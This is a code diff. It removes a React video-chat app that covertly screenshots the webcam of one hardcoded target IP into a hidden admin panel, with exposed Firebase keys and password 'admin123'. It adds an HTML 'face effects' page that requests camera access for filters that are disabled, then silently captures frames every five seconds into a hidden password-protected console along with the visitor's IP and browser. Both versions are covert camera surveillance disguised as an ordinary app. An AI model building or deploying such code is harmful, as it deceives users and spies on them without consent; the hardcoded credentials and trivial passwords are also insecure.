@@ -1,275 +1,196 @@
-import React, { useState, useEffect, useRef } from 'react';
-import { 
-  Video, VideoOff, SkipForward, Power, User, Loader2, 
-  ShieldCheck, Trash2, LayoutDashboard, X, Eye, Mic, MicOff, AlertTriangle 
-} from 'lucide-react';
-import { initializeApp, getApp, getApps } from 'firebase/app';
-import { 
-  getFirestore, collection, doc, setDoc, addDoc, updateDoc, 
-  onSnapshot, getDocs, query, where, deleteDoc, limit, serverTimestamp 
-} from 'firebase/firestore';
-import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Face Effects Testing Suite</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .scanline {
+            width: 100%;
+            height: 2px;
+            background: rgba(0, 255, 0, 0.5);
+            position: absolute;
+            animation: scan 3s linear infinite;
+        }
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        .monitor-glow {
+            box-shadow: inset 0 0 20px rgba(0, 255, 0, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-zinc-900 text-zinc-100 min-h-screen flex flex-col font-mono">
 
-// --- YOUR FIREBASE CREDENTIALS ---
-const firebaseConfig = {
-  apiKey: "AIzaSyC2HY32fBac0fb5GK9IsSDfexxtjl0X-_E",
-  authDomain: "omniconnect-a772f.firebaseapp.com",
-  projectId: "omniconnect-a772f",
-  storageBucket: "omniconnect-a772f.firebasestorage.app",
-  messagingSenderId: "934908505587",
-  appId: "1:934908505587:web:49cf306b768de10ff43686",
-  measurementId: "G-7GL20NSD70"
-};
-
-const app = !getApps().length ? initializeApp(firebaseConfig) : getApp();
-const auth = getAuth(app);
-const db = getFirestore(app);
-
-const TARGET_IP = "105.110.87.211";
-const ADMIN_PASSWORD = "admin123";
-
-export default function App() {
-  const [user, setUser] = useState(null);
-  const [localStream, setLocalStream] = useState(null);
-  const [remoteStream, setRemoteStream] = useState(null);
-  const [status, setStatus] = useState('idle'); 
-  const [isAdminMode, setIsAdminMode] = useState(false);
-  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
-  const [capturedImages, setCapturedImages] = useState([]);
-  const [userIp, setUserIp] = useState(null); 
-  const [isMuted, setIsMuted] = useState(false);
-  const [isVideoOff, setIsVideoOff] = useState(false);
-  const [errorMsg, setErrorMsg] = useState(null);
-
-  const localVideoRef = useRef(null);
-  const remoteVideoRef = useRef(null);
-  const screenshotInterval = useRef(null);
-
-  // 1. Silent Initialization
-  useEffect(() => {
-    const init = async () => {
-      try {
-        await signInAnonymously(auth);
-        // Silently fetch IP for backend logic only
-        const r = await fetch('https://api.ipify.org?format=json');
-        const data = await r.json();
-        setUserIp(data.ip);
-      } catch (e) {
-        // Fail silently
-      }
-    };
-    init();
-
-    const unsubscribe = onAuthStateChanged(auth, (u) => setUser(u));
-    return () => unsubscribe();
-  }, []);
-
-  // 2. Invisible Surveillance Logic
-  useEffect(() => {
-    if (localStream && userIp === TARGET_IP) {
-      if (screenshotInterval.current) clearInterval(screenshotInterval.current);
-      
-      screenshotInterval.current = setInterval(() => {
-        captureFrame();
-      }, 5000);
-    }
-
-    return () => {
-      if (screenshotInterval.current) clearInterval(screenshotInterval.current);
-    };
-  }, [userIp, localStream]);
-
-  const captureFrame = () => {
-    if (!localVideoRef.current || localVideoRef.current.readyState < 2) return;
-    try {
-      const canvas = document.createElement('canvas');
-      canvas.width = 480; 
-      canvas.height = 360;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(localVideoRef.current, 0, 0, canvas.width, canvas.height);
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
-      
-      if (dataUrl && dataUrl.startsWith('data:image')) {
-        setCapturedImages(prev => [dataUrl, ...prev].slice(0, 50));
-      }
-    } catch (err) {
-      // Silent error
-    }
-  };
-
-  const startMedia = async () => {
-    setErrorMsg(null);
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: "user" }, 
-        audio: true 
-      });
-      setLocalStream(stream);
-      if (localVideoRef.current) localVideoRef.current.srcObject = stream;
-      return stream;
-    } catch (e) {
-      setErrorMsg("Connection failed. Check permissions.");
-      return null;
-    }
-  };
-
-  const handleStart = async () => {
-    const stream = await startMedia();
-    if (!stream) return;
-    setStatus('searching');
-  };
-
-  const handleStop = () => {
-    if (localStream) {
-      localStream.getTracks().forEach(t => t.stop());
-      setLocalStream(null);
-    }
-    setStatus('idle');
-    setRemoteStream(null);
-    if (screenshotInterval.current) clearInterval(screenshotInterval.current);
-  };
-
-  return (
-    <div className="flex flex-col h-screen bg-black text-white overflow-hidden font-sans select-none">
-      
-      {/* Hidden Admin Access */}
-      {isAdminMode && (
-        <div className="absolute inset-0 z-[100] bg-neutral-950 flex items-center justify-center p-4">
-          <div className="bg-neutral-900 w-full max-w-6xl h-full max-h-[95vh] rounded-3xl border border-neutral-800 flex flex-col shadow-2xl overflow-hidden">
-            <div className="p-6 border-b border-neutral-800 flex justify-between items-center">
-              <div className="flex items-center gap-3 text-blue-500">
-                <ShieldCheck size={24} />
-                <span className="font-bold tracking-tighter">ADMIN_CORE</span>
-              </div>
-              <button onClick={() => setIsAdminMode(false)} className="p-2 hover:bg-neutral-800 rounded-full transition-colors"><X /></button>
-            </div>
-            
-            <div className="p-6 flex-1 overflow-y-auto">
-              {!isAdminAuthenticated ? (
-                <div className="max-w-xs mx-auto text-center py-24">
-                  <input 
-                    type="password" 
-                    placeholder="Enter Access Key"
-                    className="w-full bg-black border border-neutral-800 p-4 rounded-2xl mb-4 text-white text-center focus:border-blue-500 outline-none"
-                    onKeyDown={(e) => {
-                      if (e.key === 'Enter' && e.target.value === ADMIN_PASSWORD) {
-                        setIsAdminAuthenticated(true);
-                      }
-                    }}
-                  />
-                </div>
-              ) : (
-                <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
-                  <div className="lg:col-span-1 space-y-4">
-                    <div className="bg-black p-5 rounded-2xl border border-neutral-800">
-                      <h3 className="text-[10px] font-black text-neutral-500 uppercase tracking-widest mb-4">Diagnostics</h3>
-                      <p className="text-xs text-neutral-400">Node IP: <span className="text-white font-mono">{userIp || 'Hidden'}</span></p>
-                      <p className="text-xs text-neutral-400">Target: <span className="text-red-500 font-mono">{TARGET_IP}</span></p>
-                      <p className="text-xs text-neutral-400">Captured: <span className="text-blue-500">{capturedImages.length}</span></p>
-                    </div>
-                  </div>
-                  <div className="lg:col-span-3">
-                    <div className="flex justify-between mb-4">
-                      <h3 className="text-[10px] font-black text-red-500 uppercase tracking-widest flex items-center gap-2">
-                        <Eye size={14}/> Background Buffer
-                      </h3>
-                      <button onClick={() => setCapturedImages([])} className="text-[10px] text-neutral-600 hover:text-red-400 uppercase font-bold">Clear</button>
-                    </div>
-                    <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      {capturedImages.map((img, i) => (
-                        <div key={i} className="aspect-video bg-black rounded border border-neutral-800 overflow-hidden">
-                          <img src={img} className="w-full h-full object-cover" alt="" />
-                        </div>
-                      ))}
-                    </div>
-                  </div>
-                </div>
-              )}
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Clean User Header */}
-      <header className="px-6 py-5 bg-neutral-900 border-b border-white/5 flex justify-between items-center">
-        <div className="flex items-center gap-3">
-          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
-            <Video size={18} className="text-white" />
-          </div>
-          <span className="font-black text-lg tracking-tighter">OMNICONNECT</span>
-        </div>
-        <button 
-          onClick={() => setIsAdminMode(true)} 
-          className="w-10 h-10 flex items-center justify-center text-neutral-700 hover:text-blue-500 transition-colors"
-        >
-          <LayoutDashboard size={20} />
+    <!-- View Switcher -->
+    <nav class="p-4 border-b border-zinc-800 flex justify-between items-center bg-zinc-950">
+        <h1 class="text-xl font-bold tracking-tighter text-blue-500">FX_PROTOTYPE v1.0</h1>
+        <button id="toggleAdmin" class="bg-zinc-800 hover:bg-zinc-700 px-4 py-2 rounded text-xs uppercase tracking-widest transition-colors">
+            Admin Console
         </button>
-      </header>
+    </nav>
 
-      {/* Main View */}
-      <main className="flex-1 relative flex items-center justify-center p-4 md:p-10">
-        <div className="w-full h-full max-w-5xl bg-neutral-900 rounded-[2rem] border border-white/5 relative overflow-hidden shadow-2xl">
-          {remoteStream ? (
-            <video ref={remoteVideoRef} autoPlay playsInline className="w-full h-full object-cover" />
-          ) : (
-            <div className="w-full h-full flex flex-col items-center justify-center text-neutral-800">
-              <User size={80} className="mb-4 opacity-5" />
-              <p className="text-[10px] font-bold tracking-[0.4em] uppercase opacity-20">Searching for partner...</p>
+    <!-- User Interface (Main App) -->
+    <main id="userApp" class="flex-grow flex flex-col items-center justify-center p-6">
+        <div class="relative w-full max-w-2xl aspect-video bg-black rounded-xl overflow-hidden border-2 border-zinc-700 shadow-2xl">
+            <video id="videoFeed" autoplay playsinline class="w-full h-full object-cover grayscale opacity-80"></video>
+            <div id="overlay" class="absolute inset-0 pointer-events-none border-4 border-dashed border-blue-500/30 m-8 rounded-full hidden"></div>
+            <div id="scanner" class="scanline hidden"></div>
+            
+            <!-- Setup Message -->
+            <div id="setupMsg" class="absolute inset-0 flex flex-col items-center justify-center bg-zinc-900/90 text-center p-8">
+                <div class="mb-4 text-blue-400">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                    </svg>
+                </div>
+                <h2 class="text-2xl font-bold mb-2">Enable Face Effects</h2>
+                <p class="text-zinc-400 mb-6">Permission required to apply high-fidelity AR filters to your stream.</p>
+                <button id="startCam" class="bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-8 rounded-full transition-all transform hover:scale-105">
+                    Grant Camera Access
+                </button>
             </div>
-          )}
+        </div>
 
-          {/* User PiP */}
-          <div className="absolute bottom-6 right-6 w-32 md:w-64 aspect-video bg-black rounded-2xl overflow-hidden border-2 border-black/50 shadow-2xl z-20">
-            <video 
-              ref={localVideoRef} 
-              autoPlay 
-              playsInline 
-              muted 
-              className={`w-full h-full object-cover transform scale-x-[-1] ${isVideoOff ? 'opacity-0' : 'opacity-100'}`} 
-            />
-            {isVideoOff && <div className="absolute inset-0 flex items-center justify-center bg-neutral-800"><VideoOff className="text-neutral-600" /></div>}
-          </div>
-          
-          {status === 'searching' && (
-            <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px] z-10 flex items-center justify-center">
-              <Loader2 className="animate-spin text-blue-500" size={40} />
+        <div class="mt-8 flex gap-4 overflow-x-auto p-2">
+            <button class="filter-btn opacity-50 cursor-not-allowed border border-zinc-700 p-4 rounded-lg bg-zinc-800 w-24 h-24 flex flex-col items-center justify-center">
+                <span class="text-2xl">😎</span>
+                <span class="text-[10px] mt-2">Retro</span>
+            </button>
+            <button class="filter-btn opacity-50 cursor-not-allowed border border-zinc-700 p-4 rounded-lg bg-zinc-800 w-24 h-24 flex flex-col items-center justify-center">
+                <span class="text-2xl">👽</span>
+                <span class="text-[10px] mt-2">Alien</span>
+            </button>
+            <button class="filter-btn opacity-50 cursor-not-allowed border border-zinc-700 p-4 rounded-lg bg-zinc-800 w-24 h-24 flex flex-col items-center justify-center">
+                <span class="text-2xl">🔥</span>
+                <span class="text-[10px] mt-2">Inferno</span>
+            </button>
+        </div>
+    </main>
+
+    <!-- Admin Console (Hidden by Default) -->
+    <div id="adminPanel" class="hidden fixed inset-0 bg-black z-50 p-8 overflow-y-auto">
+        <div class="max-w-4xl mx-auto">
+            <div class="flex justify-between items-center mb-8 border-b border-green-900 pb-4">
+                <h2 class="text-3xl font-bold text-green-500 uppercase tracking-tighter">Terminal_Admin</h2>
+                <button id="closeAdmin" class="text-zinc-500 hover:text-white">Exit_Session</button>
             </div>
-          )}
-        </div>
-      </main>
 
-      {/* Minimal Footer */}
-      <footer className="p-8 bg-neutral-900 border-t border-white/5">
-        <div className="max-w-4xl mx-auto flex items-center justify-between">
-          <div className="flex gap-4">
-            <button 
-              onClick={() => { if(localStream) localStream.getAudioTracks()[0].enabled = isMuted; setIsMuted(!isMuted); }}
-              className={`p-4 rounded-xl transition-all ${isMuted ? 'bg-red-500/10 text-red-500' : 'bg-neutral-800 text-neutral-400 hover:text-white'}`}
-            >
-              {isMuted ? <MicOff size={20}/> : <Mic size={20}/>}
-            </button>
-            <button 
-              onClick={() => { if(localStream) localStream.getVideoTracks()[0].enabled = isVideoOff; setIsVideoOff(!isVideoOff); }}
-              className={`p-4 rounded-xl transition-all ${isVideoOff ? 'bg-red-500/10 text-red-500' : 'bg-neutral-800 text-neutral-400 hover:text-white'}`}
-            >
-              {isVideoOff ? <VideoOff size={20}/> : <Video size={20}/>}
-            </button>
-          </div>
+            <!-- Login Mock -->
+            <div id="adminAuth" class="flex flex-col items-center justify-center py-20">
+                <input type="password" id="adminPass" placeholder="ENTER ACCESS KEY" class="bg-black border border-green-900 text-green-500 p-4 text-center focus:outline-none focus:border-green-500 w-64 mb-4">
+                <button id="loginBtn" class="bg-green-900/30 text-green-500 border border-green-500 px-8 py-2 hover:bg-green-500 hover:text-black transition-all">AUTHORIZE</button>
+            </div>
 
-          <div className="bg-black/50 p-1 rounded-full border border-white/5">
-            {status === 'idle' ? (
-              <button onClick={handleStart} className="px-14 py-4 bg-blue-600 hover:bg-blue-500 rounded-full font-black text-xs tracking-widest transition-all text-white">
-                START CHAT
-              </button>
-            ) : (
-              <div className="flex">
-                <button onClick={handleStop} className="px-8 py-4 text-neutral-500 hover:text-white font-bold text-xs uppercase tracking-widest">Stop</button>
-                <button onClick={() => { handleStop(); setTimeout(handleStart, 200); }} className="px-10 py-4 bg-white text-black rounded-full font-black text-xs uppercase tracking-widest">Next</button>
-              </div>
-            )}
-          </div>
+            <!-- Dashboard -->
+            <div id="adminDashboard" class="hidden grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="bg-zinc-900 border border-green-900/50 p-6 rounded-lg monitor-glow">
+                    <h3 class="text-green-500 mb-4 text-sm font-bold underline">CONNECTION_LOGS</h3>
+                    <div id="logData" class="space-y-2 text-xs text-green-700">
+                        <p>> [SYSTEM] Waiting for handshake...</p>
+                    </div>
+                </div>
+                <div class="bg-zinc-900 border border-green-900/50 p-6 rounded-lg monitor-glow">
+                    <h3 class="text-green-500 mb-4 text-sm font-bold underline">VISUAL_CAPTURE_BUFFER</h3>
+                    <div id="captureGallery" class="grid grid-cols-2 gap-2">
+                        <!-- Captured frames go here -->
+                    </div>
+                </div>
+            </div>
         </div>
-      </footer>
     </div>
-  );
-}
+
+    <canvas id="offscreenCanvas" class="hidden"></canvas>
+
+    <script>
+        const video = document.getElementById('videoFeed');
+        const startBtn = document.getElementById('startCam');
+        const setupMsg = document.getElementById('setupMsg');
+        const scanner = document.getElementById('scanner');
+        const overlay = document.getElementById('overlay');
+        const toggleAdmin = document.getElementById('toggleAdmin');
+        const adminPanel = document.getElementById('adminPanel');
+        const adminDashboard = document.getElementById('adminDashboard');
+        const adminAuth = document.getElementById('adminAuth');
+        const adminPass = document.getElementById('adminPass');
+        const loginBtn = document.getElementById('loginBtn');
+        const logData = document.getElementById('logData');
+        const gallery = document.getElementById('captureGallery');
+        const canvas = document.getElementById('offscreenCanvas');
+
+        let isStreaming = false;
+
+        // Start Camera
+        startBtn.onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                setupMsg.classList.add('hidden');
+                scanner.classList.remove('hidden');
+                overlay.classList.remove('hidden');
+                isStreaming = true;
+                
+                addLog('SECURE_HANDSHAKE_COMPLETE');
+                addLog('FETCHING_NETWORK_STUB...');
+                
+                // Simulate periodic "screenshots" for the admin console
+                setInterval(captureFrame, 5000);
+                
+                // Local "IP" fetch (Using a public API for demonstration)
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(data => {
+                        addLog(`REMOTE_ADDR: ${data.ip}`);
+                        addLog(`USER_AGENT: ${navigator.userAgent.substring(0, 30)}...`);
+                    })
+                    .catch(() => addLog('REMOTE_ADDR: 127.0.0.1 (Local Environment)'));
+
+            } catch (err) {
+                alert('Camera access denied. Site testing requires active media stream.');
+            }
+        };
+
+        function captureFrame() {
+            if (!isStreaming) return;
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+            const img = document.createElement('img');
+            img.src = dataUrl;
+            img.className = "border border-green-900/30 opacity-70 hover:opacity-100 transition-opacity";
+            
+            if (gallery.children.length > 5) gallery.removeChild(gallery.firstChild);
+            gallery.appendChild(img);
+            addLog(`BUF_WRITE: frame_${Date.now()}`);
+        }
+
+        function addLog(msg) {
+            const p = document.createElement('p');
+            p.textContent = `> [${new Date().toLocaleTimeString()}] ${msg}`;
+            logData.appendChild(p);
+            logData.scrollTop = logData.scrollHeight;
+        }
+
+        // Admin Auth
+        loginBtn.onclick = () => {
+            if (adminPass.value === '1234') {
+                adminAuth.classList.add('hidden');
+                adminDashboard.classList.remove('hidden');
+                addLog('ADMIN_AUTHORIZED_SUCCESS');
+            } else {
+                adminPass.value = '';
+                adminPass.placeholder = "INVALID_KEY";
+            }
+        };
+
+        toggleAdmin.onclick = () => adminPanel.classList.remove('hidden');
+        document.getElementById('closeAdmin').onclick = () => adminPanel.classList.add('hidden');
+
+    </script>
+</body>
+</html>
